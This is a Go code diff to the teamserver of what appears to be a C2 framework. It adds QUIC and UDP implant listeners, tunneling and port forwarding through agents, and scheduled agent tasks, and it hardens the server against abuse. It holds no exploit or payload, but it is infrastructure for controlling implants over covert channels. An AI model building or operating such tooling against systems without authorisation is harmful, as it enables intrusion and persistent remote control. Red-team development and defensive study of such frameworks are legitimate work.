@@ -45,6 +45,8 @@ type Server struct {
 	apiRateLimiter *middleware.APIRateLimiter
 	loginLockout   *loginLockoutTracker
 	socksEngine    *socksRelayEngine
+	cookieProxy    *cookieProxyEngine
+	tunEngine      *tunEngine
 	startTime      time.Time
 
 	dnsListener           *DNSBeaconListener
@@ -52,14 +54,27 @@ type Server struct {
 	grpcListener          *GRPCListener
 	sshListener           *SSHBeaconListener
 	h2cListener           *H2CBeaconListener
+	quicListener          *QUICBeaconListener
 	smbLn                 net.Listener
 	tcpLn                 net.Listener
+	udpConn               net.PacketConn
 	screenMonitorImplants map[string]time.Time
 	screenMonitorMu       sync.Mutex
 
 	// P0-3: rportfwd (reverse port forward)
 	rportfwdListeners map[string]*rportfwdRelay
 	rportfwdMu        sync.Mutex
+
+	// lportfwd: agent-local listeners tunneled through the beacon; the
+	// teamserver dials the final target on the agent's behalf. Keyed by the
+	// frame ConnID chosen by the agent.
+	lportfwdTargets map[string]*lportfwdTarget // key: agentID|connID (cross-agent hijack fix)
+	lportfwdMu      sync.Mutex
+	// lportfwdDeclared tracks operator-declared targets per agent
+	// (from lportfwd_start task commands). lportfwd_connect frames must
+	// match one — otherwise a compromised implant gets an arbitrary-dial
+	// SSRF primitive into the teamserver's network.
+	lportfwdDeclared map[string]map[string]bool
 
 	trafficLog   *trafficRing
 	trafficBytes *trafficByteAccumulator
@@ -169,6 +184,11 @@ type Server struct {
 
 	// External C2 channels (WebSocket relay, Discord, Slack)
 	extC2Channels   map[string]*extC2WSChannel
+	// extC2Runners tracks LIVE poller instances (Discord/Slack) so a deleted
+	// channel can actually be stopped — previously the delete handler only
+	// removed the metadata entry and the run loop kept reconnecting with the
+	// "deleted" bot token until process restart.
+	extC2Runners     map[string]extC2Runner
 	extC2ChannelsMu sync.Mutex
 	extC2TaskQueue  map[string][]extC2Task
 	extC2TaskMu     sync.Mutex
@@ -320,9 +340,13 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		wsClients:             make(map[*websocket.Conn]*wsClientConn),
 		loginLockout:          newLoginLockoutTracker(),
 		socksEngine:           newSocksRelayEngine(),
+		cookieProxy:           newCookieProxyEngine(),
+		tunEngine:             newTunEngine(),
 		startTime:             time.Now(),
 		screenMonitorImplants: make(map[string]time.Time),
 		rportfwdListeners:     make(map[string]*rportfwdRelay),
+		lportfwdTargets:       make(map[string]*lportfwdTarget),
+		lportfwdDeclared:      make(map[string]map[string]bool),
 		trafficLog:            newTrafficRing(),
 		trafficBytes:          newTrafficByteAccumulator(),
 		autoAdaptLast:         make(map[string]time.Time),
@@ -339,6 +363,7 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		agentStatusCooldown:   make(map[string]time.Time),
 		ntlmRelays:            newNTLMRelayStore(),
 		extC2Channels:         make(map[string]*extC2WSChannel),
+		extC2Runners:          make(map[string]extC2Runner),
 		extC2TaskQueue:        make(map[string][]extC2Task),
 		extC2Notify:           make(map[string]chan struct{}),
 		buildJobs:             make(map[string]*BuildJob),
@@ -486,7 +511,8 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 	r.Use(metricsMiddleware(s.metrics))
 
 	if cfg.SIEM.Enabled && cfg.SIEM.URL != "" {
-		s.siem = NewSIEMWebhook(cfg.SIEM.URL, cfg.SIEM.Token, cfg.SIEM.Actions)
+		s.siem = NewSIEMWebhook(s, cfg.SIEM.URL, cfg.SIEM.Token, cfg.SIEM.Actions)
+		s.siem.ReloadRules()
 		slog.Info("SIEM webhook enabled", "url", cfg.SIEM.URL)
 	}
 
@@ -705,10 +731,13 @@ func (s *Server) SetupRoutes() {
 	// traffic capture explicitly. Without the limiter, these endpoints were an
 	// unbounded path into the decrypt hot path.
 	s.router.POST("/generate_204", middleware.RequestBodyLimit(BeaconMaxBodySize), s.rateLimiter.Limit(), s.trafficMiddleware(), s.handleBeacon)
-	s.router.GET("/generate_204", s.rateLimiter.Limit(), s.trafficMiddleware(), s.handleBeacon)
+	// GET carries the limit too: handleBeacon does c.GetRawData() which
+	// buffers the whole body BEFORE decodeBeaconEnvelope's length check can
+	// fire — an unauthenticated chunked body was a memory-amplification vector.
+	s.router.GET("/generate_204", middleware.RequestBodyLimit(BeaconMaxBodySize), s.rateLimiter.Limit(), s.trafficMiddleware(), s.handleBeacon)
 
 	// Catch-all for profile-defined beacon URIs (e.g. bing /th?id=...)
-	s.router.GET("/th", s.rateLimiter.Limit(), s.trafficMiddleware(), s.handleBeacon)
+	s.router.GET("/th", middleware.RequestBodyLimit(BeaconMaxBodySize), s.rateLimiter.Limit(), s.trafficMiddleware(), s.handleBeacon)
 	s.router.POST("/th", middleware.RequestBodyLimit(BeaconMaxBodySize), s.rateLimiter.Limit(), s.trafficMiddleware(), s.handleBeacon)
 	if s.cfg.Malleable.Enabled {
 		s.router.NoRoute(func(c *gin.Context) {
@@ -807,7 +836,12 @@ func (s *Server) handleWebSocket(c *gin.Context) {
 	s.wsMutex.Unlock()
 
 	// Writer goroutine: drains the buffered channel and writes to the socket.
+	// Tracked by the shutdown WaitGroup: hijacked WS conns are invisible to
+	// http.Server.Shutdown, so without wg tracking the DB could be closed
+	// while these pumps were still running.
+	s.wg.Add(1)
 	go func() {
+		defer s.wg.Done()
 		defer func() {
 			close(client.done)
 		}()
@@ -824,11 +858,16 @@ func (s *Server) handleWebSocket(c *gin.Context) {
 				conn.SetWriteDeadline(time.Now().Add(WSWriteDeadline))
 				if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
 					slog.Debug("Failed to send WebSocket message", "user", username, "err", err)
+					// Close so the blocked reader exits immediately instead of
+					// lingering for the full 60s read deadline while holding a
+					// MaxWSConnections slot.
+					conn.Close()
 					return
 				}
 			case <-ticker.C:
 				conn.SetWriteDeadline(time.Now().Add(WSWriteDeadline))
 				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
+					conn.Close()
 					return
 				}
 			}
@@ -847,7 +886,9 @@ func (s *Server) handleWebSocket(c *gin.Context) {
 	}
 	s.broadcastUserEvent("user_online", username, session)
 
+	s.wg.Add(1)
 	go func() {
+		defer s.wg.Done()
 		defer func() {
 			if r := recover(); r != nil {
 				slog.Error("WebSocket reader panicked", "user", username, "recover", r)
@@ -1147,13 +1188,13 @@ func (s *Server) cleanupOldData() {
 	cutoff := time.Now().AddDate(0, 0, -retention)
 
 	// delete old tasks
-	if err := s.db.Where("created_at < ? AND status IN ?", cutoff, []string{"completed", "failed"}).Delete(&db.Task{}).Error; err != nil {
+	if err := s.db.WithContext(s.ctx).Where("created_at < ? AND status IN ?", cutoff, []string{"completed", "failed"}).Delete(&db.Task{}).Error; err != nil {
 		slog.Error("Cleanup tasks failed", "err", err)
 	}
 
 	// delete old system metrics (monitoring persists one row every 30s; without
 	// retention the table grows ~2.9k rows/day and bloats the SQLite database)
-	if err := s.db.Where("created_at < ?", cutoff).Delete(&db.SystemMetric{}).Error; err != nil {
+	if err := s.db.WithContext(s.ctx).Where("created_at < ?", cutoff).Delete(&db.SystemMetric{}).Error; err != nil {
 		slog.Error("Cleanup system metrics failed", "err", err)
 	}
 
@@ -1289,7 +1330,10 @@ func (s *Server) cleanupGhostAgents() {
 			if err := tx.Where("agent_id IN ?", ghostIDs).Delete(&db.Task{}).Error; err != nil {
 				return err
 			}
-			return tx.Where("id IN ?", ghostIDs).Delete(&db.Implant{}).Error
+			// Hard delete (Unscoped) so auto-cleanup never leaves an invisible
+			// soft-deleted tombstone that other views (dashboard stats, etc.)
+			// would still count. Consistent with manual beacon hard-delete.
+			return tx.Unscoped().Where("id IN ?", ghostIDs).Delete(&db.Implant{}).Error
 		}); err != nil {
 			slog.Error("Failed to remove ghost agents", "err", err)
 		} else {
@@ -1316,7 +1360,8 @@ func (s *Server) cleanupGhostAgents() {
 			if err := tx.Where("agent_id IN ?", idStrs).Delete(&db.Task{}).Error; err != nil {
 				return err
 			}
-			return tx.Where("id IN ?", idStrs).Delete(&db.Implant{}).Error
+			// Hard delete, consistent with the ghost pass above and manual deletes.
+			return tx.Unscoped().Where("id IN ?", idStrs).Delete(&db.Implant{}).Error
 		}); err != nil {
 			slog.Error("Failed to remove stale agents", "err", err)
 		}
@@ -1367,7 +1412,9 @@ func (s *Server) shutdown() {
 	s.extraListenersMu.Lock()
 	for key, srv := range s.extraListeners {
 		slog.Info("Shutting down extra listener", "key", key)
-		srv.Close()
+		if srv != nil {
+			srv.Close()
+		}
 	}
 	clear(s.extraListeners)
 	s.extraListenersMu.Unlock()
@@ -1376,6 +1423,9 @@ func (s *Server) shutdown() {
 	}
 	if s.smbLn != nil {
 		s.smbLn.Close()
+	}
+	if s.udpConn != nil {
+		s.udpConn.Close()
 	}
 	if s.icmpListener != nil {
 		s.icmpListener.Close()
@@ -1395,6 +1445,10 @@ func (s *Server) shutdown() {
 	if s.h2cListener != nil {
 		slog.Info("Shutting down H2C listener")
 		s.h2cListener.Close()
+	}
+	if s.quicListener != nil {
+		slog.Info("Shutting down QUIC listener")
+		s.quicListener.Close()
 	}
 	if s.httpServer != nil {
 		// Wait briefly for in-flight requests to drain before forced shutdown
@@ -1493,6 +1547,7 @@ func (s *Server) Run() error {
 		defer s.wg.Done()
 		s.periodicRPortFwdCleanup()
 	}()
+	s.startMetricAlertLoop()
 	s.wg.Add(1)
 	go func() {
 		defer s.wg.Done()
@@ -1503,9 +1558,18 @@ func (s *Server) Run() error {
 			case <-s.ctx.Done():
 				return
 			case <-ticker.C:
-				s.requeueStaleTasks()
-				s.failStaleAcknowledgedTasks()
-				s.reconcilePendingTaskCounts()
+				// Panic guard: sibling maintenance loops have one; a panic
+				// here would otherwise take the process down mid-ticker.
+				func() {
+					defer func() {
+						if r := recover(); r != nil {
+							slog.Error("Panic in stale-task maintenance loop", "recover", r, "stack", string(debug.Stack()))
+						}
+					}()
+					s.requeueStaleTasks()
+					s.failStaleAcknowledgedTasks()
+					s.reconcilePendingTaskCounts()
+				}()
 			}
 		}
 	}()
@@ -1541,6 +1605,30 @@ func (s *Server) Run() error {
 			}
 		}()
 		s.schedulerLoop()
+	}()
+
+	// One-shot scheduled task dispatcher ("at 02:00 run X on agent Y")
+	s.wg.Add(1)
+	go func() {
+		defer s.wg.Done()
+		ticker := time.NewTicker(20 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-s.ctx.Done():
+				return
+			case <-ticker.C:
+				s.dispatchDueOneShotTasks()
+			}
+		}
+	}()
+
+	// Listener self-check heartbeat: probes every enabled listener so a dead
+	// transport flips status within minutes instead of missing beacons.
+	s.wg.Add(1)
+	go func() {
+		defer s.wg.Done()
+		s.startListenerHealthLoop()
 	}()
 
 	// Initialize Circuit Breaker
@@ -1634,6 +1722,7 @@ func (s *Server) Run() error {
 	// Start DNS C2 listener if enabled
 	if s.cfg.Server.DNSEnabled && s.cfg.Server.DNSDomain != "" {
 		dl := NewDNSBeaconListener(s.cfg.Server.DNSDomain, s.cfg.Server.Host, 0, s.cfg.Server.DNSAddr)
+		dl.SetObscure(s.cfg.Server.DNSObscure)
 		dl.SetHandler(s.makeBeaconHandler())
 		s.dnsListener = dl
 		s.wg.Add(1)
@@ -1671,6 +1760,14 @@ func (s *Server) Run() error {
 				s.sshListener = sl
 			}
 		}
+	}
+
+	if s.cfg.Server.QUICEnabled && s.cfg.Server.QUICAddr != "" {
+		s.wg.Add(1)
+		go func() {
+			defer s.wg.Done()
+			s.startQUICListener()
+		}()
 	}
 
 	// Start H2C (cleartext HTTP/2) beacon listener if enabled
@@ -1822,27 +1919,63 @@ func (s *Server) handleListenerBeacon(agentID string, reqJSON []byte) []byte {
 }
 
 // startExtraListener starts an additional listener for the given scheme and key.
+// The limit check reserves a placeholder under lock to prevent concurrent
+// callers from both passing the check and exceeding the limit.
 func (s *Server) startExtraListener(key, scheme string) error {
 	s.extraListenersMu.Lock()
 	if len(s.extraListeners) >= MaxExtraListeners {
 		s.extraListenersMu.Unlock()
 		return fmt.Errorf("extra listener limit reached (%d)", MaxExtraListeners)
 	}
+	// Reject a duplicate key that already owns a running listener, otherwise
+	// a concurrent POST with the same key would overwrite it and leak the
+	// previously bound socket.
+	if existing := s.extraListeners[key]; existing != nil {
+		s.extraListenersMu.Unlock()
+		return fmt.Errorf("listener already running for key %q", key)
+	}
+	// Reserve placeholder to make the limit check atomic with insertion.
+	// Only reserve when there is no existing (possibly still-starting) entry.
+	if _, exists := s.extraListeners[key]; !exists {
+		s.extraListeners[key] = nil
+	}
 	s.extraListenersMu.Unlock()
+	var err error
+	defer func() {
+		if err != nil {
+			s.extraListenersMu.Lock()
+			if s.extraListeners[key] == nil {
+				delete(s.extraListeners, key)
+			}
+			s.extraListenersMu.Unlock()
+		}
+	}()
 
 	switch scheme {
 	case "http", "https":
-		return s.startExtraHTTPListener(key, scheme)
+		err = s.startExtraHTTPListener(key, scheme)
+		return err
 	case "tcp", "tls":
-		return s.startExtraTCPListener(key, scheme)
+		err = s.startExtraTCPListener(key, scheme)
+		return err
 	case "dns":
-		return s.startExtraDNSListener(key)
+		err = s.startExtraDNSListener(key)
+		return err
 	case "icmp":
-		return s.startExtraICMPListener(key)
+		err = s.startExtraICMPListener(key)
+		return err
 	case "ssh":
-		return s.startExtraSSHListener(key)
+		err = s.startExtraSSHListener(key)
+		return err
 	case "h2c":
-		return s.startExtraH2CListener(key)
+		err = s.startExtraH2CListener(key)
+		return err
+	case "quic":
+		err = s.startExtraQUICListener(key)
+		return err
+	case "udp":
+		err = s.startExtraUDPListener(key)
+		return err
 	default:
 		slog.Warn("Unknown extra listener scheme, skipping", "scheme", scheme, "key", key)
 		return nil
@@ -1933,6 +2066,20 @@ func (s *Server) startExtraTCPListener(key, scheme string) error {
 		for {
 			conn, aErr := ln.Accept()
 			if aErr != nil {
+				select {
+				case <-s.ctx.Done():
+					ln.Close()
+					s.extraListenersMu.Lock()
+					delete(s.extraListeners, key)
+					s.extraListenersMu.Unlock()
+					return
+				default:
+				}
+				if ne, ok := aErr.(net.Error); ok && ne.Temporary() {
+					time.Sleep(50 * time.Millisecond)
+					continue
+				}
+				slog.Error("Extra TCP accept error (listener exiting)", "key", key, "addr", addr, "err", aErr)
 				break
 			}
 			s.wg.Add(1)
@@ -1966,15 +2113,16 @@ func (s *Server) startExtraDNSListener(key string) error {
 	dl := NewDNSBeaconListener(l.DNSDomain, l.Host, l.ID, addr)
 	dl.SetHandler(s.makeBeaconHandler())
 
+	// Start() binds synchronously and returns the bind error — calling it in
+	// a fire-and-forget goroutine meant a port conflict left a dead listener
+	// registered as "running", silently dropping all DNS C2 traffic.
+	if err := dl.Start(); err != nil {
+		return fmt.Errorf("extra DNS listener %s: %w", key, err)
+	}
+
 	s.extraListenersMu.Lock()
 	s.extraListeners[key] = dl
 	s.extraListenersMu.Unlock()
-
-	s.wg.Add(1)
-	go func() {
-		defer s.wg.Done()
-		dl.Start()
-	}()
 
 	slog.Info("Extra DNS listener started", "domain", l.DNSDomain, "addr", addr)
 	return nil
@@ -2044,6 +2192,35 @@ func (s *Server) periodicRPortFwdCleanup() {
 			return
 		case <-ticker.C:
 			s.cleanupStaleRPortFwd()
+			s.cleanupStaleLPortFwd()
+		}
+	}
+}
+
+// cleanupStaleLPortFwd drops tunneled lportfwd connections whose agent no
+// longer exists or is offline, mirroring the rportfwd sweep.
+func (s *Server) cleanupStaleLPortFwd() {
+	s.lportfwdMu.Lock()
+	agentIDs := make([]string, 0, len(s.lportfwdTargets))
+	for _, t := range s.lportfwdTargets {
+		agentIDs = append(agentIDs, t.agentID)
+	}
+	s.lportfwdMu.Unlock()
+	if len(agentIDs) == 0 {
+		return
+	}
+	var agents []db.Implant
+	if err := s.db.Where("id IN ?", agentIDs).Limit(len(agentIDs)).Find(&agents).Error; err != nil {
+		slog.Error("Failed to batch-load agents for lportfwd cleanup", "error", err)
+		return
+	}
+	online := make(map[string]bool, len(agents))
+	for i := range agents {
+		online[agents[i].ID] = agents[i].Status == "online"
+	}
+	for _, id := range agentIDs {
+		if !online[id] {
+			s.cleanupLPortFwdForAgent(id)
 		}
 	}
 }
@@ -2166,42 +2343,43 @@ func (s *Server) startUDPListener() {
 		slog.Error("Failed to start UDP listener", "addr", s.cfg.Server.UDPAddr, "err", err)
 		return
 	}
+	s.udpConn = pc
 	slog.Info("UDP transport layer listening", "addr", s.cfg.Server.UDPAddr)
 
 	buf := make([]byte, 16*1024*1024)
-	for {
-		select {
-		case <-s.ctx.Done():
-			pc.Close()
-			return
-		default:
-		}
-		n, addr, err := pc.ReadFrom(buf)
-		if err != nil {
-			select {
-			case <-s.ctx.Done():
+	s.wg.Add(1)
+	go func() {
+		defer s.wg.Done()
+		defer pc.Close()
+		for {
+			pc.SetReadDeadline(time.Now().Add(1 * time.Second))
+			n, addr, err := pc.ReadFrom(buf)
+			if err != nil {
+				select {
+				case <-s.ctx.Done():
+					return
+				default:
+				}
+				if ne, ok := err.(net.Error); ok && ne.Timeout() {
+					continue
+				}
+				slog.Error("UDP read error", "err", err)
 				return
-			default:
 			}
-			if ne, ok := err.(net.Error); ok && ne.Timeout() {
+			if n == 0 {
 				continue
 			}
-			slog.Error("UDP read error", "err", err)
-			continue
+			data := make([]byte, n)
+			copy(data, buf[:n])
+			resp := s.handleUDPBeacon(data, addr)
+			if len(resp) == 0 {
+				continue
+			}
+			if _, err := pc.WriteTo(resp, addr); err != nil {
+				slog.Error("UDP write error", "remote", addr.String(), "err", err)
+			}
 		}
-		if n == 0 {
-			continue
-		}
-		data := make([]byte, n)
-		copy(data, buf[:n])
-		resp := s.handleUDPBeacon(data, addr)
-		if len(resp) == 0 {
-			continue
-		}
-		if _, err := pc.WriteTo(resp, addr); err != nil {
-			slog.Error("UDP write error", "remote", addr.String(), "err", err)
-		}
-	}
+	}()
 }
 
 // handleUDPBeacon processes one UDP beacon datagram and returns the response
@@ -2215,6 +2393,62 @@ func (s *Server) handleUDPBeacon(data []byte, addr net.Addr) []byte {
 	// Mirror the TCP transport's optional malleable cover (a no-op unless a
 	// malleable profile with prepend/append is configured).
 	return s.applyMalleableWrapping(resp)
+}
+
+type udpPacketCloser struct {
+	pc net.PacketConn
+}
+
+func (u *udpPacketCloser) Close() error {
+	if u == nil || u.pc == nil {
+		return nil
+	}
+	return u.pc.Close()
+}
+
+func (s *Server) startExtraUDPListener(key string) error {
+	addr := strings.TrimPrefix(key, "udp://")
+	pc, err := net.ListenPacket("udp", addr)
+	if err != nil {
+		return err
+	}
+	s.extraListenersMu.Lock()
+	s.extraListeners[key] = &udpPacketCloser{pc: pc}
+	s.extraListenersMu.Unlock()
+	s.wg.Add(1)
+	go func() {
+		defer s.wg.Done()
+		defer pc.Close()
+		buf := make([]byte, 16*1024*1024)
+		for {
+			select {
+			case <-s.ctx.Done():
+				return
+			default:
+			}
+			n, raddr, readErr := pc.ReadFrom(buf)
+			if readErr != nil {
+				select {
+				case <-s.ctx.Done():
+					return
+				default:
+				}
+				return
+			}
+			if n == 0 {
+				continue
+			}
+			data := make([]byte, n)
+			copy(data, buf[:n])
+			resp := s.handleUDPBeacon(data, raddr)
+			if len(resp) == 0 {
+				continue
+			}
+			_, _ = pc.WriteTo(resp, raddr)
+		}
+	}()
+	slog.Info("Extra UDP listener started", "addr", addr, "key", key)
+	return nil
 }
 
 // ActivityMiddleware updates user's LastActivity timestamp on each request (throttled to 60s)
